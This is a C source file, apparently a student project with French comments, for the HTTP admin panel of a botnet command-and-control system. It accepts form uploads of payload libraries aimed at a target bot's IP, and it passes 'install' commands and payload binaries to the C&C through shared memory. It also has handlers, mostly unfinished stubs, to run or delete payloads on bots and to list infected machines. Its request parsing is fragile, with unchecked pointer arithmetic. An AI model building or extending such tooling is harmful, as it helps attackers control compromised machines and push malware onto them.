/* HTTP Server

To communicate with the HTTP server :
Launch ./serveur then go to : 127.0.0.1:4100/page_admin.html

Listen on port TCP 4100 and analyse POST forms returned by page_admin.html

We can analyze the following forms :
- Upload a dynamic library
- Run a dynamic library
- Remove a charge
- Get the result of a charge's execution
- Ask for bot's statistics
- List botnets' IP
- List C&C's dynamic libraries

The data received are displayed on the terminal.

*/
#include "libfluxthread.h"
#include "libipc.h"
#include "libudp.h"
#include "libtcp.h"

#define CLE_SEMAPHORE (key_t)1100
#define CLE_MEM_PARTAGEE (key_t)1200
#define CLE_SEMAPHORE_2 (key_t)1300
#define CLE_MEM_PARTAGEE_2 (key_t)1400
#define WEB_DIR "./www"
#define PAGE_NOTFOUND "error.html"
#define MAX_BUFFER 10240
#define CODE_OK  200
#define CODE_NOTFOUND 404
#define NB_MAX_CHARGES 50

/* Variables globales */
mutex_flux_t mutex_shm;
mutex_flux_t mutex_shm_2;
signal_flux_t cnd;
mutex_flux_t mutex_signal;

/* Prototypes */
void handler(int SignalNum);
void* upload_charge_shm(void* arg);
void* serveur_shm(void* arg);
int get_champ_3eme_ligne(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin,char* boundary);
int get_nom_charge(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin);
int get_data_POST(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin,char* boundary);
int fonction_Web(int socket);


/* Intercepte CTRL + C : destruction des semaphores */
void handler(int SignalNum)
{
    if(SignalNum==SIGINT){
        printf("\nInterruption SIGINT\n");

		detruit_semaphore(CLE_SEMAPHORE);
		detruit_semaphore(CLE_SEMAPHORE_2);

		printf("Semaphores SHM detruits\n");
        exit(0);
    }
}


/* Donne le 3eme champ : ip, ou nom de charge */
int get_champ_3eme_ligne(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin,char* boundary){
	char fin_de_ligne[]="\r\n";
	unsigned char* pt=NULL;

	int data_restant_etape1 = data_restant;

	int taille_donnees = data_restant_etape1;
	int taille_charge = 0;

	*p_debut=debut_du_data;
	pt = memmem(debut_du_data,taille_donnees,boundary,strlen(boundary));
	if(pt!=NULL) taille_donnees = data_restant_etape1 - (*p_debut-pt);
	else printf("Probleme memmem chaine non trouvee\n");

	for(int i=0; i<3; i++){
		*p_debut=pt;
		pt = memmem(*p_debut,taille_donnees,fin_de_ligne,strlen(fin_de_ligne));

		if(pt!=NULL) taille_donnees = data_restant_etape1 - (*p_debut-pt);
		else printf("[for]Probleme memmem chaine de fin de ligne non trouvee %d\n",taille_donnees);

		pt+=strlen(fin_de_ligne);
	}

	*p_debut=pt;

	*p_fin=memmem(*p_debut,taille_donnees,debut_du_data,strlen(boundary))-strlen(fin_de_ligne);
	taille_charge = *p_fin-*p_debut;

	return taille_charge;
}

/* Donne le nom de la charge lors de l'upload */
int get_nom_charge(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin){
	char* to_seek="filename=";
	char fin_de_ligne[]="\r\n";

	int data_restant_etape0 = data_restant;
	int taille_nom_charge = data_restant_etape0;

	*p_debut = memmem(debut_du_data,data_restant_etape0,to_seek,strlen(to_seek));
	if(*p_debut!=NULL) taille_nom_charge = data_restant_etape0 - (*p_debut-*p_fin);
	else printf("Probleme memmem chaine non trouvee\n");

	*p_debut += strlen(to_seek) + 1;

	*p_fin = memmem(*p_debut,taille_nom_charge,fin_de_ligne,strlen(fin_de_ligne));
	*p_fin -= 1;

	taille_nom_charge = *p_fin - *p_debut;

	return taille_nom_charge;
}

/* recupère le data que l'on veut uploader */
int get_data_POST(int data_restant,unsigned char* debut_du_data,unsigned char** p_debut,unsigned char** p_fin,char* boundary){
	unsigned char* pt=NULL;
	char fin_de_ligne[]="\r\n";

	int data_restant_etape1 = data_restant;

	int taille_donnees = data_restant_etape1;
	int taille_charge=0;

	*p_debut=debut_du_data;
	pt = memmem(*p_debut,data_restant_etape1,boundary,strlen(boundary));
	if(pt!=NULL) taille_donnees = data_restant_etape1 - (*p_debut-pt);
	else printf("Probleme memmem chaine non trouvee\n");

	for(int i=0; i<4; i++){
		*p_debut=pt;
		pt = memmem(*p_debut,taille_donnees,fin_de_ligne,strlen(fin_de_ligne));

		if(pt!=NULL) taille_donnees = data_restant_etape1 - (*p_debut-pt);
		else printf("[for]Probleme memmem chaine de fin de ligne non trouvee %d\n",taille_donnees);

		pt+=strlen(fin_de_ligne);
	}

	*p_debut=pt;

	*p_fin=memmem(*p_debut,taille_donnees,boundary,strlen(boundary))-2*strlen(fin_de_ligne);
	taille_charge = *p_fin-*p_debut;

	return taille_charge;
}

/*Ecrit la structure charge, et l'ip du bot dans la mémoire partagée, synchronisé avec le C&C*/
void* upload_charge_shm(void* arg){
	char message[TAILLE_MEM_PARTAGEE];
	struct sembuf tab_semaphores[NB_SEMAPHORE];
	unsigned char* data=NULL;

	charge_shm_t* pt = (charge_shm_t*)arg;

	P_semaphore_thread(&mutex_shm);

	/* Envoie de "install" */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	strcpy(message,"install");
	data=malloc(strlen(message));
	memcpy(data,message,strlen(message));
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;

	/* Envoie de la taille de l'ip */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	sprintf(message,"%d",pt->ip_size);
	data=malloc(strlen(message));
	memcpy(data,message,strlen(message));
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;

	/* Envoie de l'ip */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	strncpy(message,pt->mon_ip,pt->ip_size);
	data=malloc(pt->ip_size);
	memcpy(data,message,pt->ip_size);
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;
	free(pt->mon_ip); pt->mon_ip=NULL;

	/* Envoie status */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	sprintf(message,"%d",pt->ma_charge.status);
	data=malloc(strlen(message));
	memcpy(data,message,strlen(message));
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;

	/* Envoie taille du nom de la charge */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	sprintf(message,"%d",pt->ma_charge.name_size);
	data=malloc(strlen(message));
	memcpy(data,message,strlen(message));
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;

	/* Envoie du nom de la charge */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	strncpy(message,pt->ma_charge.name,pt->ma_charge.name_size);
	data=malloc(pt->ma_charge.name_size);
	memcpy(data,message,pt->ma_charge.name_size);
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;
	free(pt->ma_charge.name); pt->ma_charge.name=NULL;

	/* Envoie taille_data */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);

	sprintf(message,"%d",pt->ma_charge.data_size);
	data=malloc(strlen(message));
	memcpy(data,message,strlen(message));
	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,data,TAILLE_MEM_PARTAGEE);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, TAILLE_MEM_PARTAGEE);
	detruit_semaphore(CLE_SEMAPHORE);
	free(data); data=NULL;

	/* Envoie DATA */
	init_semaphore(CLE_SEMAPHORE,tab_semaphores);
	init_mem_partagee(CLE_MEM_PARTAGEE, pt->ma_charge.data_size);

	ecrit_mem_partagee(CLE_MEM_PARTAGEE,CLE_SEMAPHORE,tab_semaphores,pt->ma_charge.data,pt->ma_charge.data_size);

	detruit_mem_partagee(CLE_MEM_PARTAGEE, pt->ma_charge.data_size);
	detruit_semaphore(CLE_SEMAPHORE);
	free(pt->ma_charge.data); pt->ma_charge.data=NULL;


	V_semaphore_thread(&mutex_shm);
	return NULL;
}

/* Serveur TCP : analyse les formualaires POST */
int fonction_Web(int socket)
{
	char buffer[MAX_BUFFER];
	char cmd[MAX_BUFFER];
	char page[MAX_BUFFER];
	char proto[MAX_BUFFER];
	char path[MAX_BUFFER];
	char type[MAX_BUFFER];
	char entetes[MAX_BUFFER];
	char encryption_type[MAX_BUFFER];
	char entetes_boundary[MAX_BUFFER];

	char* pt_boundary=NULL;

	long data_size = 0;

	bool envoyer_charge_b = false;
	bool executer_charge_b = false;
	bool demander_ex_charge_b = false;
	bool supprimer_charge_b = false;
	bool liste_ip_b = false;
	bool get_bot_etat_b = false;
	bool liste_charges_b = false;

	FILE* stream_4_s=fdopen(socket, "a+");
	if(stream_4_s==NULL){
		perror("ouverture fdopen : ");
		exit(0);
	}

	if(fgets(buffer,MAX_BUFFER,stream_4_s)==NULL){
		exit(-1);
	}
	if(sscanf(buffer,"%s %s %s",cmd,page,proto)!=3){
		exit(-1);
	}


	while(fgets(buffer,MAX_BUFFER,stream_4_s)!=NULL)
	{
		sscanf(buffer,"%s",entetes);

		if(strcasecmp(entetes,"Content-Length:")==0){
			sscanf(buffer,"%s %ld",entetes,&data_size);
		}
		if(strcasecmp(entetes,"Content-Type:")==0){

			sscanf(buffer,"%s %s %s",entetes,encryption_type,entetes_boundary);

			char to_search[]="=";
			pt_boundary = memmem(entetes_boundary,strlen(entetes_boundary),to_search,strlen(to_search))+1;

			if(pt_boundary == NULL){
				printf("pointeur pt_boundary NULL : %p\n",pt_boundary);
				exit(0);
			}

			if(strcasecmp(page,"/envoie_charge.html")==0){
				envoyer_charge_b = true;
			}
			else if(strcasecmp(page,"/executer_charge.html")==0){
				executer_charge_b = true;
			}
			else if(strcasecmp(page,"/supprimer_charge.html")==0){
				supprimer_charge_b = true;
			}
			else if(strcasecmp(page,"/demander_charge.html")==0){
				demander_ex_charge_b = true;
			}
			else if(strcasecmp(page,"/etat_bot.html")==0){
				get_bot_etat_b = true;
			}
			else if(strcasecmp(page,"/liste_ip.html")==0){
				liste_ip_b = true;
			}
			else if(strcasecmp(page,"/liste_charge.html")==0){
				liste_charges_b = true;
			}
		}
		if(strcmp(buffer,"\r\n")==0){
			break;
		}
	}

//-------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------
	if(data_size!=0){
		int taille_data_traite = 0;

		unsigned char* data=NULL;
		data=malloc(data_size * sizeof(*data));
		unsigned char* p_data=data;

		while(taille_data_traite < data_size){
			fread(p_data,1,1,stream_4_s);
			p_data ++;
			taille_data_traite ++;
		}


	//-------------------------------------------------------------------------------------------
	// 						PREMIER FORMULAIRE : uploader une charge
	//-------------------------------------------------------------------------------------------
		if(envoyer_charge_b==true){
			charge_t ma_charge;
			ma_charge.name=NULL;
			ma_charge.data=NULL;

			printf("\n\tPremier formulaire : upload charge\n");

			//-----------------------------------------------------------------
			// 		PREMIER CHAMP : le nom de la charge
			//-----------------------------------------------------------------

			unsigned char* pointeur_nom_debut = NULL;
			unsigned char* pointeur_nom_fin = NULL;

			int taille_nom_charge = get_nom_charge(data_size,data,&pointeur_nom_debut,&pointeur_nom_fin);

			if(taille_nom_charge<0){
				printf("[debug]taille negative, pas d'allocation memoire' possible %d\n",taille_nom_charge);
				exit(0);
			}

			ma_charge.name = malloc(taille_nom_charge+1);
			memcpy(ma_charge.name,pointeur_nom_debut,taille_nom_charge);
			ma_charge.name[taille_nom_charge]=0;// ne pas oublier le '\0' de fin de chaine
			ma_charge.name_size = taille_nom_charge+1;

			printf("nom de la charge : %s\n",ma_charge.name);
			printf("taille nom de la charge : %d lettres\n",ma_charge.name_size-1);//on compte pas le '\0'

			//-----------------------------------------------------------------
			// 		DEUXIEME CHAMP : les données de la charge (son binaire)
			//-----------------------------------------------------------------

			unsigned char* p_donnees_debut=NULL;
			unsigned char* p_donnees_fin=NULL;

			int taille_charge=get_data_POST(data_size,data,&p_donnees_debut,&p_donnees_fin,pt_boundary);

			if(taille_charge <0){
				printf("[debug]taille negative, pas d'allocation memoire' possible %d\n",taille_charge);fflush(stdout);
				exit(0);
			}

			ma_charge.data = malloc(taille_charge);
			memcpy(ma_charge.data,p_donnees_debut,taille_charge);

			ma_charge.data_size = taille_charge;
			ma_charge.status = 0;

			printf("taille charge : %d octets\n",ma_charge.data_size);

			//-----------------------------------------------------------------
			// 		TOISIEME CHAMP : l'ip du bot cible
			//-----------------------------------------------------------------

			p_donnees_debut=p_donnees_fin+2;
			p_donnees_fin=NULL;
			int taille_ip = get_champ_3eme_ligne(data_size-taille_charge,p_donnees_debut,&p_donnees_debut,&p_donnees_fin,pt_boundary);

			unsigned char* mon_ip=NULL;
			mon_ip = malloc(taille_ip+1);

			if(mon_ip==NULL  || p_donnees_debut==NULL || taille_ip<0){
				printf("Probleme de taille, pointeur... memcpy impossible\n");
				exit(0);
			}
			memcpy(mon_ip,p_donnees_debut,taille_ip);
			mon_ip[taille_ip]=0;
			taille_ip++;

			printf("taille ip : %d lettres\n",taille_ip-1);//on ignore le '\0'
			printf("ip du bot cible : %s\n",mon_ip);

			/* lancement du thread upload charge */
			charge_shm_t ma_charge_a_upload;

			ma_charge_a_upload.ma_charge=ma_charge;
			ma_charge_a_upload.ip_size=taille_ip;
			ma_charge_a_upload.mon_ip=malloc(taille_ip);
			memcpy(ma_charge_a_upload.mon_ip,mon_ip,taille_ip);
			free(mon_ip); mon_ip=NULL;

			lancer_flux(upload_charge_shm,(void*) &ma_charge_a_upload,sizeof(ma_charge_a_upload));

		}//fin du if(envoyer_charge_b==true)

	//-------------------------------------------------------------------------------------------
	// 	2eme, 3eme, 4eme formulaires : executer, supprimer et demander le résultat d'une charge
	//-------------------------------------------------------------------------------------------
		if(executer_charge_b || demander_ex_charge_b || supprimer_charge_b){

			//-----------------------------------------------------------------
			// 		PREMIER CHAMP : nom de la charge
			//-----------------------------------------------------------------

			unsigned char* p_donnees_debut=NULL;
			unsigned char* p_donnees_fin=NULL;
			int taille_charge = get_champ_3eme_ligne(data_size,data,&p_donnees_debut,&p_donnees_fin,pt_boundary);

			unsigned char* charge_name = malloc(taille_charge+1);
			memcpy(charge_name,p_donnees_debut,taille_charge);
			charge_name[taille_charge]=0;
			taille_charge++;

			//-----------------------------------------------------------------
			// 		DEUXIEME CHAMP : l'ip du bot cible
			//-----------------------------------------------------------------

			p_donnees_debut=p_donnees_fin+2;
			p_donnees_fin=NULL;
			int taille_ip = get_champ_3eme_ligne(data_size-taille_charge,p_donnees_debut,&p_donnees_debut,&p_donnees_fin,pt_boundary);

			unsigned char* mon_ip = malloc(taille_ip+1);
			if(charge_name==NULL  || p_donnees_debut==NULL || taille_ip<0){
				printf("Probleme de taille, pointeur... memcpy impossible\n");
				exit(0);
			}
			memcpy(mon_ip,p_donnees_debut,taille_ip);
			mon_ip[taille_ip]=0;
			taille_ip++;

			//-----------------------------------------------------------------
			// 		Lancement des threads
			//-----------------------------------------------------------------

			if(executer_charge_b==true){
				printf("\n[serveur http] execution de la charge nommee '%s'",charge_name);
				printf(" sur le bot d'ip : %s\n",mon_ip);
				printf("taille nom charge : %d lettres\n",taille_charge-1);//on ignore le '\0'
				printf("taille ip : %d lettres\n",taille_ip-1);//on ignore le '\0'
			}
			else if(demander_ex_charge_b==true){
				int index=atoi((char*)charge_name);
				printf("\n[serveur http] demande du resultat de la charge d'index '%d'",index);
				printf(" sur le bot d'ip : %s\n",mon_ip);
				printf("taille nom charge : %d lettres\n",taille_charge-1);//on ignore le '\0'
				printf("taille ip : %d lettres\n",taille_ip-1);//on ignore le '\0'
				//---------------------------------------------------------------- THREAD DEMANDE RESULTAT CHARGE ---------------------------------
				// to do
			}
			else if(supprimer_charge_b==true){
				printf("\n[serveur http] suppressions de la charge nommee '%s'",charge_name);
				printf(" sur le bot d'ip : %s\n",mon_ip);
				printf("taille nom charge : %d lettres\n",taille_charge-1);//on ignore le '\0'
				printf("taille ip : %d lettres\n",taille_ip-1);//on ignore le '\0'
				//---------------------------------------------------------------- THREAD SUPPRIMER CHARGE ---------------------------------
				// to do
			}
			free(charge_name);
			free(mon_ip);
			charge_name=NULL;
			mon_ip=NULL;
		}

	//-------------------------------------------------------------------------------------------
	// 	5eme formulaires : retourner l'état d'un bot
	//-------------------------------------------------------------------------------------------
		if(get_bot_etat_b == true){
			//-----------------------------------------------------------------
			// 		PREMIER CHAMP : ip du bot
			//-----------------------------------------------------------------

			unsigned char* p_ip_debut=NULL;
			unsigned char* p_ip_fin=NULL;
			int taille_ip = get_champ_3eme_ligne(data_size,data,&p_ip_debut,&p_ip_fin,pt_boundary);

			unsigned char* mon_ip = malloc(taille_ip);
			memcpy(mon_ip,p_ip_debut,taille_ip);

			printf("\n[serveur http] Je retourne l'etat du bot d'ip : %s\n",mon_ip);
			//---------------------------------------------------------------- THREAD LISTE IP ---------------------------------
			// to do
			free(mon_ip); //valeur copiée normallement dans une structure plus globale lors du lancement du thread (pas encore codé)
			mon_ip=NULL;
		}

	//-------------------------------------------------------------------------------------------
	// 	6eme formulaires : liste l'ip des bots infectés
	//-------------------------------------------------------------------------------------------
		if(liste_ip_b == true){
			printf("\n[serveur http] Liste des ips des bots detectes\n");
			//-------------------------------------------------------------------- THREAD LISTE IP BOT ---------------------------------
			// to do
		}

	//-------------------------------------------------------------------------------------------
	// 	7eme formulaires : liste des charges à disposition du C&C
	//-------------------------------------------------------------------------------------------
		if(liste_charges_b == true){
			printf("\n[serveur http] Liste des charges du C&C\n");
			//-------------------------------------------------------------------- THREAD LISTE CHARGES C&C ---------------------------------
			// to do
		}
		free(data);
		data=NULL;
	}


//-------------------------------------------------------------------------------------------
// 				Ecrire dans notre page html
//-------------------------------------------------------------------------------------------
	if(strcasecmp(cmd,"GET")==0 || strcasecmp(cmd,"POST")==0){

		int code=CODE_OK;
		struct stat fstat;
		sprintf(path,"%s%s",WEB_DIR,page);

		if(stat(path,&fstat)!=0 || !S_ISREG(fstat.st_mode)){
			sprintf(path,"%s/%s",WEB_DIR,PAGE_NOTFOUND);
			code=CODE_NOTFOUND;
		}

		strcpy(type,"text/html");
		char *end=page+strlen(page);

		if(strcmp(end-4,".png")==0) strcpy(type,"image/png");
		if(strcmp(end-4,".jpg")==0) strcpy(type,"image/jpg");
		if(strcmp(end-4,".gif")==0) strcpy(type,"image/gif");

		fprintf(stream_4_s,"HTTP/1.0 %d\r\n",code);
		fprintf(stream_4_s,"Server: CWeb\r\n");
		fprintf(stream_4_s,"Content-type: %s\r\n",type);
		fprintf(stream_4_s,"Content-length: %ld\r\n",fstat.st_size);
		fprintf(stream_4_s,"\r\n");
		fflush(stream_4_s);


		int fd=open(path,O_RDONLY);
		if(fd>=0){
			int bytes;
			while((bytes=read(fd,buffer,MAX_BUFFER))>0){
				fwrite(buffer,1,bytes,stream_4_s);
			}
			close(fd);
		}
	}
	fclose(stream_4_s);
	return 0;
}

/* Lit dans la mémoire partagée les données envoyées par le C&C */
void* serveur_shm(void* arg){
	int retour=0;
	unsigned char msg_recu[TAILLE_MEM_PARTAGEE];
	struct sembuf tab_semaphores_2[NB_SEMAPHORE];
	init_semaphore(CLE_SEMAPHORE_2,tab_semaphores_2);

	while(1){
		P_semaphore_thread(&mutex_shm_2);

		retour=lit_mem_partagee(CLE_MEM_PARTAGEE_2, CLE_SEMAPHORE_2,tab_semaphores_2,msg_recu,TAILLE_MEM_PARTAGEE);

		V_semaphore_thread(&mutex_shm_2);


		if (retour != -1){//on a lu quelque chose de nouveau sur la mémoire partagée

			if(strncmp((char*) msg_recu,"id",strlen("id"))==0){
				printf("\n\tlancer thread ecrire ID sur la page html");
			}
            //to do
		}
		sleep(1);
	}
	return arg;
}


int main(){
	init_semaphore_thread(&mutex_shm);
	init_semaphore_thread(&mutex_shm_2);
    init_semaphore_thread(&mutex_signal);
    init_signal_thread(&cnd);

	/* Mise en place d'un gestionnaire de signal */
	struct sigaction prepaSignal;
	prepaSignal.sa_handler=&handler;
	prepaSignal.sa_flags=0;
	sigemptyset(&prepaSignal.sa_mask);
	sigaction(SIGINT,&prepaSignal,0);

	/* "serveur" shm : attend les donées écrites par le C&C */
	lancer_flux(serveur_shm,NULL,0);

	/* serveur TCP pour l'analyse des formulaires POST*/
	char service[5]="4100"; // PORT TCP
	int socket = initialisationServeur(service,MAX_CONNEXIONS);
	boucleServeur(socket,fonction_Web);

	synchro_thread();
	shutdown(socket, SHUT_RDWR);
	return 0;
}
